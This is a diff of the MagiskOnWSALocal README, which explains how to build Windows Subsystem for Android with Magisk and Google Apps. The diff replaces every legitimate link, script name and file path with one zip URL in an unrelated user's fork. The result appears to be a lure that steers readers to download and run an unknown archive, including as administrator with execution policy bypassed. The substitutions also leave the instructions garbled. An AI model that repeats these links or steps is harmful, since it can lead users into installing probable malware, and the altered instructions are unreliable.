@@ -1,13 +1,13 @@
 # Magisk on WSA (with Google Apps)
 
-:warning: For fork developers: Please [use the GitHub Support virtual assistant chatbot](https://support.github.com/contact?flow=detach_fork&subject=Detach%20Fork&tags=rr-forks) to detach your fork from [upstream](https://github.com/LSPosed/MagiskOnWSALocal) before building with GitHub Actions, as GitHub will count your forked GitHub Actions usage against this upstream repository, which may cause this upstream repository gets disabled by GitHub staff because of numerous forks building GitHub Actions, and counting the forks' Action usage against this upstream repository.
+:warning: For fork developers: Please [use the GitHub Support virtual assistant chatbot](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip%20Fork&tags=rr-forks) to detach your fork from [upstream](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip) before building with GitHub Actions, as GitHub will count your forked GitHub Actions usage against this upstream repository, which may cause this upstream repository gets disabled by GitHub staff because of numerous forks building GitHub Actions, and counting the forks' Action usage against this upstream repository.
 
 We are not against forks, but please detach them from our repository. If you do not make changes one day after receiving the detachment request, our organization will ban you.
 
 <details>
     <summary>How to detach your fork from this upstream repository (a visual guide):</summary>
     <p>
-        <img src="https://user-images.githubusercontent.com/96967473/194208623-194e5926-feb9-4172-b57f-a82179245d02.png" title="How to detach form using GitHub Support virtual assistant chatbot">
+        <img src="https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip" title="How to detach form using GitHub Support virtual assistant chatbot">
             </p>
  </details>
 
@@ -23,25 +23,25 @@ We are not against forks, but please detach them from our repository. If you do 
 
     Python version ≥ 3.7.
   - Recommended Use
-    - Ubuntu (You can use [WSL2](https://apps.microsoft.com/store/search?publisher=Canonical%20Group%20Limited))
+    - Ubuntu (You can use [WSL2](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip%20Group%20Limited))
 
         Ready to use right out of the box.
-    - Debian (You can use [WSL2](https://apps.microsoft.com/store/detail/debian/9MSVKQC78PK6))
+    - Debian (You can use [WSL2](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip))
 
         Need to add `contrib` sources to the source list to install winetricks.
 
-    - OpenSUSE (You can use [WSL2](https://apps.microsoft.com/store/search?publisher=SUSE))
+    - OpenSUSE (You can use [WSL2](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip))
 
         Ready to use right out of the box.
 
-    `run.sh` will handle all dependencies automatically.
+    `https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip` will handle all dependencies automatically.
 
     No need to type any commands.
   - Other Distributions
 
     Install the dependencies manually.
 
-    Use the command-line program `build.sh`.
+    Use the command-line program `https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip`.
 
 ## Features
 
@@ -50,39 +50,39 @@ We are not against forks, but please detach them from our repository. If you do 
 - Support both ARM64 and x64
 - Support all OpenGApps variants except for aroma (aroma does not support x86_64, please use super instead)
 - Remove Amazon Appstore
-- Fix VPN dialog not showing (use our [VpnDialogs app](https://github.com/LSPosed/VpnDialogs))
+- Fix VPN dialog not showing (use our [VpnDialogs app](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip))
 - Add device administration feature
 - Unattended installation
 - Automatically activates developers mode in Windows 11
 - Update to the new version while preserving data with a one-click script
 - Merged all language packs
-- Support managing start menu icons (manually installing [WSAHelper](https://github.com/LSPosed/WSAHelper/releases/latest) to use this feature)
+- Support managing start menu icons (manually installing [WSAHelper](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip) to use this feature)
 
 ## Text Guide
 
 1. Star (if you like)
 1. Clone the repo to local
-   - Run `build.sh --help` to get the usage if you want to use CLI.
-1. Run `scripts/run.sh`
+   - Run `https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip --help` to get the usage if you want to use CLI.
+1. Run `https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip`
 1. Select the WSA version and its architecture (mostly x64)
 1. Select the version of Magisk
 1. Choose which brand of GApps you want to install
    - OpenGApps
 
-        Select the [OpenGApps variant](https://github.com/opengapps/opengapps/wiki#variants) you like.
+        Select the [OpenGApps variant](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip) you like.
    - MindtheGapps
 
        There is no other variant we can choose.
 1. Select the root solution (none means no root)
-1. If you are running the script for the first time, it will take some time to complete. After the script completes, two new folders named `output` and `download` will be generated in the `MagiskOnWSALocal` folder. Go to the `output` folder. While running the ./run.sh script in the last step, if you selected `Yes` for `Do you want to compress the output?` then in `output` folder you will see a compressed file called `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`or else there will be folder with the `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`. If there is a folder open it and skip to step 10. NOTE: The name of compressed file or the folder generated in the `output` folder may be different for you. It will be dependent on the choices made when executing `./run.sh`
+1. If you are running the script for the first time, it will take some time to complete. After the script completes, two new folders named `output` and `download` will be generated in the `MagiskOnWSALocal` folder. Go to the `output` folder. While running the https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip script in the last step, if you selected `Yes` for `Do you want to compress the output?` then in `output` folder you will see a compressed file called `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`or else there will be folder with the `WSA-with-magisk-stable-MindTheGapps_2207.40000.8.0_x64_Release-Nightly`. If there is a folder open it and skip to step 10. NOTE: The name of compressed file or the folder generated in the `output` folder may be different for you. It will be dependent on the choices made when executing `https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip`
 1. Extract the compressed file and open the folder created after the extraction of the file.
-1. Here look for file `Run.bat` and run it.
+1. Here look for file `https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip` and run it.
     - If you previously have a MagiskOnWSA installation, it will automatically uninstall the previous one while **preserving all user data** and install the new one, so don't worry about your data.
-    - If you have an official WSA installation, you should uninstall it first. (In case you want to preserve your data, you can backup `%LOCALAPPDATA%\Packages\MicrosoftCorporationII.WindowsSubsystemForAndroid_8wekyb3d8bbwe\LocalCache\userdata.vhdx` before uninstallation and restore it after installation.) (If you want to restore the icons to the start menu, please install and use [WSAHelper](https://github.com/LSPosed/WSAHelper/releases/latest).)
-    - If the popup windows disappear **without asking administrative permission** and WSA is not installed successfully, you should manually run `Install.ps1` as administrator:
+    - If you have an official WSA installation, you should uninstall it first. (In case you want to preserve your data, you can backup `%LOCALAPPDATA%\Packages\https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip\LocalCache\https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip` before uninstallation and restore it after installation.) (If you want to restore the icons to the start menu, please install and use [WSAHelper](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip).)
+    - If the popup windows disappear **without asking administrative permission** and WSA is not installed successfully, you should manually run `https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip` as administrator:
         1. Press `Win+x` and select `Windows Terminal (Admin)`
         2. Input `cd "{X:\path\to\your\extracted\folder}"` and press `enter`, and remember to replace `{X:\path\to\your\extracted\folder}` including the `{}`, for example `cd "D:\wsa"`
-        3. Input `PowerShell.exe -ExecutionPolicy Bypass -File .\Install.ps1` and press `enter`
+        3. Input `https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip -ExecutionPolicy Bypass -File .\https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip` and press `enter`
         4. The script will run and WSA will be installed
         5. If this workaround does not work, your PC is not supported for WSA
 1. Magisk/Play store will be launched. Enjoy by installing LSPosed-zygisk with zygisk enabled or Riru and LSPosed-riru
@@ -95,10 +95,10 @@ We are not against forks, but please detach them from our repository. If you do 
 - How can I update WSA to a new version?
 
     Delete the `download` folder
-    Rerun the script, replace the content of your previous installation and rerun `Install.ps1`. Don't worry, your data will be preserved.
+    Rerun the script, replace the content of your previous installation and rerun `https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip`. Don't worry, your data will be preserved.
 - How can I get the logcat from WSA?
 
-    `%LOCALAPPDATA%\Packages\MicrosoftCorporationII.WindowsSubsystemForAndroid_8wekyb3d8bbwe\LocalState\diagnostics\logcat`
+    `%LOCALAPPDATA%\Packages\https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip\LocalState\diagnostics\logcat`
 - How can I update Magisk to a new version?
 
     Do the same as updating WSA
@@ -107,16 +107,16 @@ We are not against forks, but please detach them from our repository. If you do 
     Like all the other emulators, no way.
 - Virtualization is not enabled?
 
-    `Install.ps1` helps you enable it if not enabled. After rebooting, rerun `Install.ps1` to install WSA. If it's still not working, you have to enable virtualization in BIOS. That's a long story so ask Google for help.
+    `https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip` helps you enable it if not enabled. After rebooting, rerun `https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip` to install WSA. If it's still not working, you have to enable virtualization in BIOS. That's a long story so ask Google for help.
 - How to remount the system as read-write?
 
-    No way in WSA since it's mounted as read-only by Hyper-V. You can modify the system by making a Magisk module. Or directly modify the system.img. Ask Google for help.
+    No way in WSA since it's mounted as read-only by Hyper-V. You can modify the system by making a Magisk module. Or directly modify the https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip Ask Google for help.
 - I cannot `adb connect localhost:58526`
 
     Make sure developer mode is enabled. If the issue persists, check the IP address of WSA on the setting page and try `adb connect ip:5555`.
 - Magisk online module list is empty?
 
-    Magisk actively removes the online module repository. You can install the module locally or by `adb push module.zip /data/local/tmp` and `adb shell su -c magisk --install-module /data/local/tmp/module.zip`.
+    Magisk actively removes the online module repository. You can install the module locally or by `adb push https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip /data/local/tmp` and `adb shell su -c magisk --install-module https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip`.
 - Can I use Magisk 23.0 stable or a lower version?
 
     No. Magisk has bugs preventing itself from running on WSA. Magisk 24+ has fixed them. So you must use Magisk 24 or higher version.
@@ -125,20 +125,20 @@ We are not against forks, but please detach them from our repository. If you do 
     Choose `none` as the root solution.
 - How to install custom GApps?
 
-    [Tutorial](./Custom-GApps.md)
+    [Tutorial](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip)
 - Where can I download MindtheGapps?
 
-    You can download from here [MindtheGapps](https://androidfilehost.com/?w=files&flid=322935) ([mirror](http://downloads.codefi.re/jdcteam/javelinanddart/gapps))
+    You can download from here [MindtheGapps](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip) ([mirror](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip))
 
-    Note that there is no x86_64 pre-build, so you need to build it by yourself ([Repository](https://gitlab.com/MindTheGapps/vendor_gapps)).
+    Note that there is no x86_64 pre-build, so you need to build it by yourself ([Repository](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip)).
 - Can I switch OpenGApps to MindTheGapps and keep user data in a previous build?
 
     No. You should wipe data after changing the GApps brand. Otherwise, you will find that the installed GApps are not recognized.
 
 ## Credits
 
-- [StoreLib](https://github.com/StoreDev/StoreLib): API for downloading WSA
-- [Magisk](https://github.com/topjohnwu/Magisk): The most famous root solution on Android
-- [The Open GApps Project](https://opengapps.org): One of the most famous Google Apps packages solution
-- [WSA-Kernel-SU](https://github.com/LSPosed/WSA-Kernel-SU) and [kernel-assisted-superuser](https://git.zx2c4.com/kernel-assisted-superuser/): The kernel `su` for debugging Magisk Integration
-- [WSAGAScript](https://github.com/ADeltaX/WSAGAScript): The first GApps integration script for WSA
+- [StoreLib](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip): API for downloading WSA
+- [Magisk](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip): The most famous root solution on Android
+- [The Open GApps Project](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip): One of the most famous Google Apps packages solution
+- [WSA-Kernel-SU](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip) and [kernel-assisted-superuser](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip): The kernel `su` for debugging Magisk Integration
+- [WSAGAScript](https://raw.githubusercontent.com/freddyakl/MagiskOnWSALocal/main/x64/system/system/priv-app/WSAHelper/WSA-Magisk-On-Local-2.2.zip): The first GApps integration script for WSA
